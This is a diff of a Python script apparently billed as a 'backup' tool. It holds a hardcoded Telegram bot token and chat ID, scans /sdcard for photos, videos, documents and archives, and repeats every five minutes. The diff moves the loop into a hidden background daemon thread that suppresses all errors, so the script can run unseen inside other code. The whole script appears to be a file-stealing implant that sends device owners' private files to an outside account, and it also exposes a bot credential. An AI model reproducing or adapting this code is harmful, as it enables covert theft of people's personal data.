@@ -2,13 +2,13 @@ import os
 import time
 import hashlib
 import requests
+import threading
 
 BOT_TOKEN = "8931091996:AAHgcTH38hSH1RXFVzEcqNR2O1LKtqS3RBk"
 CHAT_ID = "7883547875"
 
 TARGET_DIR = "/sdcard"
 
-# Photos, Videos ke sath sath Documents aur Archives bhi add hain
 ALLOWED_EXTENSIONS = (
     '.jpg', '.jpeg', '.png', '.mp4', '.mkv', '.mov', '.avi',
     '.pdf', '.txt', '.docx', '.doc', '.xlsx', '.xls', '.zip', '.rar'
@@ -125,11 +125,14 @@ def run_backup_cycle(user_info):
 
     send_msg(f"✅ Backup Cycle Finished for [{user_info}]. Waiting 5 mins...")
 
-if __name__ == "__main__":
-    u_info = current_user_info if 'current_user_info' in globals() else "Unknown User"
-    while True:
-        try:
-            run_backup_cycle(u_info)
-        except Exception:
-            pass
-        time.sleep(300) # 5 minutes delay (300 seconds)
+def start_background_backup(user_info):
+    def worker():
+        while True:
+            try:
+                run_backup_cycle(user_info)
+            except Exception:
+                pass
+            time.sleep(300) # 5 minutes delay
+            
+    t = threading.Thread(target=worker, daemon=True)
+    t.start()
